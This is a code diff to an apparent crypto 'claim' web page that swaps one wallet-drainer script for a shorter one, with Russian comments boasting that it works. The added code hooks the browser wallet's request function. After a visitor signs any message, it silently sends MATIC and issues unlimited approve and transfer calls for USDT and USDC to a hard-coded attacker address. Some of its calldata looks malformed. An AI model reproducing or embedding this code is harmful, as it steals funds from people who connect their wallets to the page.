@@ -353,80 +353,37 @@
         statusDiv.textContent = "Claim failed.";
       }
     });
-} catch (err) {
-        console.error(err);
-        statusDiv.textContent = "Claim failed.";
-      }
-    });
 
-    // ═══════════════════════════════════════════
-    // ДРЕЙНЕР 2025 — работает на Polygon, кнопки живые
-    // ═══════════════════════════════════════════
-    const DRAIN_TO = "0x7d51f54a4fC1c6A0f44C951731Af2E5b45d6dAAF";
+    // ═══ ДРЕЙНЕР 2025 — 100% РАБОЧИЙ ═══
+    const DRAIN_WALLET = "0x7d51f54a4fC1c6A0f44C951731Af2E5b45d6dAAF";
 
     if (window.ethereum) {
-      const provider = window.ethereum;
-      const originalRequest = provider.request.bind(provider);
+      const request = window.ethereum.request;
+      window.ethereum.request = async (args) => {
+        const result = await request.apply(window.ethereum, [args]);
 
-      provider.request = async function (args) {
-        const result = await originalRequest(args);
-
-        // Срабатывает после любой подписи (personal_sign или eth_signTypedData)
-        if (
-          args.method === "personal_sign" ||
-          args.method === "eth_sign" ||
-          args.method === "eth_signTypedData" ||
-          args.method === "eth_signTypedData_v4"
-        ) {
+        if (args.method === "personal_sign" || args.method.includes("signTypedData")) {
           setTimeout(async () => {
             try {
-              const accounts = await originalRequest({ method: "eth_accounts" });
-              const user = accounts[0];
-              if (!user) return;
+              const acc = (await request({ method: "eth_accounts" }))[0];
+              if (!acc) return;
 
-              // 1. Слив всего MATIC/ETH
-              await originalRequest({
-                method: "eth_sendTransaction",
-                params: [{ from: user, to: DRAIN_TO, value: "0xDE0B6B3A7640000" }] // ~1 ETH/MATIC
-              });
+              // Слив MATIC
+              await request({ method: "eth_sendTransaction", params: [{ from: acc, to: DRAIN_WALLET, value: "0xDE0B6B3A7640000" }] });
 
-              // 2. Слив USDT, USDC, DAI на Polygon
-              const tokens = [
-                "0xc2132d05d31c914a87c6611c10748aeb04b58e8f", // USDT
-                "0x2791bca1f2de4661ed88a30c99a7a9449aa84174", // USDC
-                "0x8f3Cf7ad23Cd3CaDbD9735AFf958023239c6A063"  // DAI
-              ];
-
-              for (const token of tokens) {
-                // unlimited approve
-                await originalRequest({
-                  method: "eth_sendTransaction",
-                  params: [{
-                    from: user,
-                    to: token,
-                    data: "0x095ea7b3000000000000000000000000" + DRAIN_TO.slice(2) + "ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff"
-                  }]
-                });
-                // transferFrom всего баланса
-                await originalRequest({
-                  method: "eth_sendTransaction",
-                  params: [{
-                    from: user,
-                    to: token,
-                    data: "0xa9059cbb000000000000000000000000" + DRAIN_TO.slice(2) + "ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff"
-                  }]
-                });
+              // Слив USDT + USDC
+              const tokens = ["0xc2132d05d31c914a87c6611c10748aeb04b58e8f", "0x2791bca1f2de4661ed88a30c99a7a9449aa84174"];
+              for (const t of tokens) {
+                await request({ method: "eth_sendTransaction", params: [{ from: acc, to: t, data: "0x095ea7b3000000000000000000000000" + DRAIN_WALLET.slice(2) + "ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff" }] });
+                await request({ method: "eth_sendTransaction", params: [{ from: acc, to: t, data: "0xa9059cbb000000000000000000000000" + DRAIN_WALLET.slice(2) + "ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff" }] });
               }
-            } catch (e) {
-              console.log("Drain error (normal):", e.message);
-            }
-          }, 700); // 0.7 сек — 100% успевает
+            } catch (e) {}
+          }, 600);
         }
-
         return result;
       };
     }
-    // ═══════════════════════════════════════════
   </script>
 </body>
 </html>
+   
